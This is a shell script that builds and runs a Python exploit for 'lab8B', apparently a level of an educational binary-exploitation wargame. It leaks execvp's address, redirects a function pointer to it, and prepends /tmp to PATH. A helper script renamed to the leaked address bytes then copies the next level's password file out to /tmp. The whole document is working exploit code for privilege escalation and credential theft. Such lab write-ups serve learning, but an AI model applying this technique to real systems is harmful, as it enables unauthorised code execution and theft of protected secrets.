#!/bin/bash
# Preparation for exploit lab8B.py

#   Observations: There is a secret function thisIsASecret() that will spawn a
# shell when called. We get extra points if we don't use it, since this is an
# educational challenge, I thought I could get the most of it if I added the
# constraint of not using the provided function.

#   Exploitation: Leveraging the bug in fave() can let us control the pointer
# used to print the structures. The rest is just a matter of ROPing correctly.

# Get filename
cat > /tmp/.getflag.py <<EOF
#!/usr/bin/python
# coding: utf-8
import sys
f = open('/home/lab8A/.pass', 'r')
k = open('/tmp/lab8Aflag', 'w')
k.write(f.readline())
f.close()
k.close()
EOF

cat > /tmp/lab8B.py <<EOF
#!/usr/bin/python
# coding: utf-8

'''
Exploit for level lab8B
'''

import os
import pexpect
import struct
import time

##################
#  Global stuff  #
##################

#  ****** IMPORTANT ******
# Make sure that this values correspond to your binary aswell. If they are not
# equal, the exploit will fail.
execvpoff = 0x68da0  # (gdb) print execvp - printf
# *************************

###############
#  Functions  #
###############


def read(p):
    '''
    Reads all the buffered output from p.
    '''
    ret = []
    while True:
        try:
            p.expect('\n')
            s = p.before
            if not s:
                break
            s = s.replace('\r', '\n')
            s = s.strip()
            ret.append(s)
        except (pexpect.EOF, pexpect.TIMEOUT):
            ret.append(p.before)
            break
    return ret


def wrrd(p, *buf):
    '''
    Writes buf into subprocess' stdin and returns it's output.
    '''
    out = []
    for elm in buf:
        p.sendline(str(elm))
        out.extend(read(p))
        time.sleep(0.1)
    out.extend(read(p))
    return out


def findstart(l, s):
    '''
    Looks for a string that starts with s in l and returns it.
    '''
    for x in l:
        if x.startswith(s):
            return x
    else:
        return ''


if __name__ == '__main__':
    proc = pexpect.spawn('/levels/lab08/lab8B', timeout=0.1)
    try:
        print '[STAGE 1] INIT STAGE 1: Leak execvp() addresses'
        o = wrrd(proc, 4, 5)
        printf = int(findstart(o, 'void printFunc')[16:], 16)
        execvp = printf + execvpoff
        print '[STAGE 1] execvp @ 0x%08x' % execvp

        print '\n[STAGE 2] INIT STAGE 2: Rename /tmp/.getflag.py'
        filename = struct.pack('<I', execvp).split('\x00')[0]
        # We have to account for the '1' we will introduce in the
        # structure
        filename = filename+'1' if '\x00' not in filename else filename
        fn = ''.join('\\\\'+hex(ord(x))[1:] for x in filename)
        os.system('mv /tmp/.getflag.py \'/tmp/%s\'' % filename)
        print '[STAGE 2] /tmp/.getflag.py renamed to /tmp/%s' % fn

        print '\n[STAGE 3] INIT STAGE 3: Preparing structure'
        ex = -0x100000000 + execvp if (execvp & 0x80000000) else execvp
        wrrd(proc, 1, 1, 1, 1, 1, ex-1, 1, 1, 1, 1, 1)
        wrrd(proc, 1, 2, 1, 1, 1, 1, 1, 1, 1, 1, 1)
        wrrd(proc, 2, 4, 4, 4)
        wrrd(proc, 5)
        wrrd(proc, 6, 3, 1)
        print '[STAGE 3] Structure prepared, printFunc -> execvp()'

        print '\n[FINAL STAGE] Call execvp() and retreive the flag'
        wrrd(proc, 3, 1)
    except KeyboardInterrupt:
        print '[+] Ctrl-C requested, shutting down...'
EOF

echo '[+] Preparing exploit'

chmod uog+rwx /tmp/.getflag.py
echo '[+] /tmp/.getflag.py ready!'

# Add /tmp/ to PATH
export PATH=/tmp/:$PATH
echo '[+] /tmp/ added to path'
echo '[+] Exploit ready to run!'
echo

# Run exploit
python /tmp/lab8B.py
echo "[FINAL STAGE] flag: $(cat /tmp/lab8Aflag)"
